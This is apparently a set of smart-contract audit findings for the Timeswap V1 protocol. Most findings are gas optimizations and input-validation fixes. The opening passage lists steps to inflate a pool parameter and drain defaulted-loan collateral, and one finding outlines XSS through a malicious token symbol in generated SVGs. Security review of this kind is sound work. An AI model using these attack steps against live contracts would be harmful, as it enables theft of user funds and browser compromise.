the attacker can do the following:  1. `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests); 2. `pay()` the loan and get back the collateral; 3. `lend()` a regular amount of `state.x`, get a large amount of insurance token; 4. `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.  ## Recommendation  Consider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/DateTime.sol#L127-L134  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             uint daysInMonth = _getDaysInMonth(year, month);             if (day > 0 && day <= daysInMonth) {                 valid = true;             }         }     } ```  The local variable `daysInMonth` is used only once. Making the expression inline can save gas.  ### Recommendation  Change to:  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             if (day > 0 && day <= _getDaysInMonth(year, month)) {                 valid = true;             }         }     } ```  Other examples include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Burn.sol#L76-L77  ```solidity         IPair pair = factory.getPair(params.asset, params.collateral);         require(address(pair) != address(0), 'E501'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L556-L558  ```solidity         IDue collateralizedDebt = natives[asset][collateral][maturity].collateralizedDebt;          require(msg.sender == address(collateralizedDebt), 'E701'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L62-L63  ```solidity         uint256 _assetReserve = asset.safeBalance();         require(_assetReserve >= assetReserve + assetIn, 'E304'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L51-L52  ```solidity         uint256 _collateralReserve = collateral.safeBalance();         require(_collateralReserve >= collateralReserve + collateralIn, 'E305'); ```  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L5-L5  ```solidity import {IPair} from '../interfaces/IPair.sol'; ```  `IPair` is unused in `Callback.sol`.  
# Handle  WatchPug   # Vulnerability details  `flag == 0` is cheaper than `temp % 10 == 0`.   Therefore, checking `flag == 0 `first can save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L162-L162  ```solidity if (temp % 10 == 0 && flag == 0) ```  ### Recommendation  Change to:  ```solidity     if (flag == 0 && temp % 10 == 0)  ```  Other instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L180-L180  ```solidity else if (value % 10 != 0 && flag == 0)  ```  
# Handle  WatchPug   # Vulnerability details  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  For example:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L149-L150  ```solidity         require(block.timestamp < maturity, 'E202');         require(maturity - block.timestamp < 0x100000000, 'E208'); ```   `maturity - block.timestamp` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L31-L33  ```solidity         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ```  `deficit -= state.reserves.asset` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MsgValue.sol#L12-L12  ```solidity if (msg.value > value) ETH.transfer(payable(msg.sender), msg.value - value); ```  `msg.value - value` will never underflow.  
# Handle  WatchPug   # Vulnerability details  Move storage writes to inside the code block of `if (tokensOut.asset > 0) {...}` can avoid unnecessary code execution when this check doesn't pass and save gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L214-L218  ```solidity         pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ``` ### Recommendation  Change to:  ```solidity         if (tokensOut.asset > 0) {                 pool.state.reserves.asset -= tokensOut.asset;                 asset.safeTransfer(assetTo, tokensOut.asset);         }         if (tokensOut.collateral > 0) {                 pool.state.reserves.collateral -= tokensOut.collateral;                 collateral.safeTransfer(collateralTo, tokensOut.collateral);         } ```    
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L157-L169  ```solidity=157 if (pool.state.totalLiquidity == 0) {     uint256 liquidityTotal = MintMath.getLiquidityTotal(xIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } else {     uint256 liquidityTotal = MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } ```  ### Recommendation  Change to:  ```solidity=157 uint256 liquidityTotal = pool.state.totalLiquidity == 0 ?     MintMath.getLiquidityTotal(xIncrease) :     MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease); liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);  pool.state.totalLiquidity += liquidityTotal; pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; ```  1. Avoiding code duplication; 2. Using the ternary operator to make the code shorter.  
# Handle  WatchPug   # Vulnerability details  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Instances include:  - `TimeswapPair.sol#pay()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L359   - `PayMath.sol#givenMaxAssetsIn()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L21   
# Handle  rfa   # Vulnerability details  ## Impact more expensive gas  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L58  instead of caching state on memory. just read it directly from the storage.  State memory state = pools[maturity].state;  ## Tools Used self research on:  https://remix.ethereum.org/  ## Recommended Mitigation Steps State storage state = pools[maturity].state;  
# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Open TODOs can point to architecture or programming issues that still need to be resolved.  ## Proof of Concept The TODO is here: https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L87  ## Tools Used VS Code  ## Recommended Mitigation Steps Consider resolving the TODO before deploying.  
# Handle  ye0lde   # Vulnerability details  ## Impact  The function below fails to perform input validation on arrays to verify the lengths match.  A mismatch could lead to an exception or undefined behavior.  ## Proof of Concept  `ids`, `assetsIn` (copied into from `maxAssetsIn` on line 18) https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L15-L28  While `givenMaxAssetsIn` is an internal function if you trace the code back the parameters are passed in by an external function (`pay` or `payEthAsset` or `payEthCollateral`) with no array length validation.  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps  Add input validation to check that the length of all arrays match (`ids`, `maxAssetsIn`).  
# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Typos  ## Proof of Concept The typos are here:  'recommnded' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapFactory.sol#L11 https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L20  'seconde' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IFactory.sol#L39  'addres' 'dcrease' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IPair.sol#L319-L320   ## Tools Used VS Code  ## Recommended Mitigation Steps Correct the typos  
# Handle  thank_you   # Vulnerability details  ## Impact SVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.  The `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.   These set of circumstances leads to XSS when the SVG is loaded on any website.   ## Proof of Concept 1. Hacker generates an ERC20 token with a symbol that contains malicious Javascript. 2. Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1. 3. When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol. 4. When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.   ## Tools Used N/A  ## Recommended Mitigation Steps Creating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.   As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.   
# Handle  OriDabush   # Vulnerability details  # TimeswapPair.sol - Gas Optimization Lines 289-290 can be transferred into the if statements to avoid subtract 0 from the variables.  ### code before: pool.state.reserves.asset -= tokensOut.asset;  pool.state.reserves.collateral -= tokensOut.collateral;  if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);  if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);  ### code after:  if (tokensOut.asset > 0) {     asset.safeTransfer(assetTo, tokensOut.asset);     pool.state.reserves.asset -= tokensOut.asset; }  if (tokensOut.collateral > 0) {     collateral.safeTransfer(collateralTo, tokensOut.collateral);     pool.state.reserves.collateral -= tokensOut.collateral; }     
# Handle  Dravee   # Vulnerability details  ## Impact   If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    ## Proof of Concept   Instances include:   ``` Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:119:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:147:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:201:        for (uint256 i = 0; i < data.length; i++) { ```     ## Tools Used   Manual Analysis      ## Recommended Mitigation Steps   Remove explicit initialization for default values.   
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.  The root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  ## Proof of Concept  The root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol  The `safeSymbol()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.  The root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:  https://kauri.io/#single/dai-token-guide-for-developers/#token-info  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  ## Proof of Concept  The root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol  The `safeName()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.  A similar issue was found in a previoud code4rena contest: https://github.com/code-423n4/2021-05-nftx-findings/issues/46  ## Proof of Concept  The root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol  The following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32` https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54  `safeDecimals()` is used in multiple functions such as - CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54) - Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34) - Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)  ## Recommended Mitigation Steps  Modify the `safeDecimals()` function to change >= 32 to == 32 like this `if (success && data.length == 32) return   abi.decode(data, (uint8));`  
# Handle  p4st13r4   # Vulnerability details  ## Impact  In `TimeswapConvenience.sol` the `weth` state variable is read twice. It can just be immediately assigned locally so that the two `deposit` calls avoid reading the same variable from storage  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505) - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `weth` to `localWeth`  
# Handle  p4st13r4   # Vulnerability details  ## Impact  In `CollateralizedDebt.sol` the `pair` state variable is read twice. It can just be immediately assigned locally so that the `require` and the `collateralizedDebtCallback` do not read the same state variable twice  ## Proof of Concept  ```jsx function timeswapPayCallback(uint128 assetIn, bytes calldata data) external override {     require(msg.sender == address(pair), 'E401');      convenience.collateralizedDebtCallback(pair, maturity, assetIn, data); } ```  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `pair` to e.g `localPair`  
# Handle  Meta0xNull   # Vulnerability details  ## Impact A wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62-L64  ## Tools Used Manual Review  ## Recommended Mitigation Steps requires Addresses is not zero.  require(_factory != address(0), "Address Can't Be Zero") require(_weth != address(0), "Address Can't Be Zero")  
# Handle  hyh   # Vulnerability details  ## Impact  Similarly, the system will fail with low-level message without giving a business reason, which can be an issue for troubleshooting and further programmatic usages by other projects.   ## Proof of Concept  The owner variable is used by TimeswapPair.pay without validation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L357  Which will yield low-level fail on array access if an owner is zero or not present in the system:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L360   ## Recommended Mitigation Steps  Verify owner function argument to be non-zero by expanding existing check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L352  Then, require in line 358 that, for example, dues.length >= ids.length:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L358   
# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on state variables storage access.  ## Proof of Concept  getCollateral only reads state.reserves.asset, state.totalClaims.insurance and state.reserves.collateral up to 2 times each, and state.totalClaims.bond up to 4 times:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L26   ## Recommended Mitigation Steps  Save all four state variables to memory before running the logic.   
# Handle  hyh   # Vulnerability details  ## Impact  If there is no liquidity in the pool, burn operation will not make sense and be reverted on low level math of decreasing liquidity share. It will be more transparent and uniform to add a check for liquidity before the logic.   ## Proof of Concept  ` burn` doesn't check for liquidity of the pool:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L205   ## Recommended Mitigation Steps  There is a check in other relevant functions, it can be added in the very same form here: ` require(pool.state.totalLiquidity > 0, 'E206')`  Error description can be updated to include ` burn `:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/ErrorCodes.md#e206   
# Handle  rfa   # Vulnerability details  ## Impact more expensive gas usage  ## Proof of Concept instead of using operator && on single require check. using additional require check can save more gas:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L151-L152 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L201-L202 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L234-L235 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L272-L273 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L309-L310 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L351  ## Tools Used https://remix.ethereum.org  ## Recommended Mitigation Steps example: require(liquidityTo != address(0), 'E201' ); require(dueTo != address(0), 'E201');   
# Handle  bitbopper   # Vulnerability details  ## Impact `https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L121:L126` could be more gas efficient  ## Proof of Concept ### Version as in Repo  ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofOld {  uint256 locked = 0;   modifier lock() {      require(locked == 0, 'E211');      locked = 1;      _;      locked = 0;  }   function test() public lock {  }  } ``` ### Proposed Version ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofNew {  uint256 locked = 1;   modifier lock() {      require(locked == 1, 'E211');      locked = 2;      _;      locked = 1;  }   function test() public lock {  }  } ```  ### Comparison #### Test harness ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  import "ds-test/test.sol";  import "./LockProofOld.sol"; import "./LockProofNew.sol";  contract LockProofTest is DSTest {     LockProofOld lockproofold;     LockProofNew lockproofnew;      function setUp() public {         lockproofold = new LockProofOld();         lockproofnew = new LockProofNew();     }      function test_old() public {   lockproofold.test();     }      function test_new() public {   lockproofnew.test();     } } ``` #### Output ``` dapp test Running 2 tests for src/LockProof.t.sol:LockProofTest [PASS] test_old() (gas: 21042) [PASS] test_new() (gas: 1136) ```   
# Handle  Dravee   # Vulnerability details  ## Impact The `acceptOwner()` external function can be called indefinitely instead of only once. The contract's state doesn't reflect reality. The code doesn't follow the standard implementation of a 2-step ownership transfer.  ## Proof of Concept Here's the current `acceptOwner()` external function, which lacks a reset of `pendingOwner` to `address(0)` : ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;          emit AcceptOwner(msg.sender);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Change the code to: ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;         pendingOwner = address(0); // @audit : line to add          emit AcceptOwner(msg.sender);     } ```  
# Handle  Dravee   # Vulnerability details  ## Impact Removing unused named return variables can reduce gas usage and improve code clarity.  ## Proof of Concept In `TimeswapPair:constantProduct()`, you return using both named return and actual return statement. To save gas and improve code quality consider using only one of those.  ```     /// @inheritdoc IPair     function constantProduct(uint256 maturity)         external         view         override         returns (             uint112 x,             uint112 y,             uint112 z         )     {         State memory state = pools[maturity].state;         return (state.x, state.y, state.z);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove the unused named returns  
# Handle  Dravee   # Vulnerability details  ## Impact Some of the require statements can be placed earlier to reduce gas usage on revert. As a reminder from the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf), Appendix G and Appendix H: - TIMESTAMP costs 2 gas - ADDRESS costs 2 gas - MLOAD costs 3 gas  ## Proof of Concept The following can be reorder to save gas on revert:  ```         require(block.timestamp < maturity, 'E202');          require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205');         require(to != address(0), 'E201');         require(to != address(this), 'E204'); ``` to ```         require(block.timestamp < maturity, 'E202');         require(to != address(0), 'E201');         require(to != address(this), 'E204');         require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205'); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Relocate the said require statements  
# Handle  Dravee   # Vulnerability details  ## Impact   Due to how `constant` variables are implemented, an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.      If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.    See: [ethereum/solidity#9232]([https://github.com/ethereum/solidity/issues/9232](https://github.com/ethereum/solidity/issues/9232))      ## Proof of Concept   ```   Timeswap-V1-Convenience\contracts\libraries\DateTime.sol:31:    uint constant SECONDS_PER_DAY = 24 * 60 * 60; Timeswap-V1-Convenience\contracts\libraries\DateTime.sol:32:    uint constant SECONDS_PER_HOUR = 60 * 60; ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Change these expressions from `constant` to `immutable` and implement the calculation in the constructor   
# Handle  hyh   # Vulnerability details  ## Impact  There can be issues with troubleshooting and system usage analytics.  ## Proof of Concept  E512 error code is meant for 'Debt is greater than max Debt' situation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e512   In Mint library E512 is used for collateral max value check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L482   Also, code E513, that is to be used for collateral check above, is also used for max asset increase check, which doesnt seem to have an error code of its own:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L481  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L643   ## Recommended Mitigation Steps  Change Mint line 482 error code to be 513: https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e513  Possibly add an error code for max asset check for Mint lines 481 and 643.  
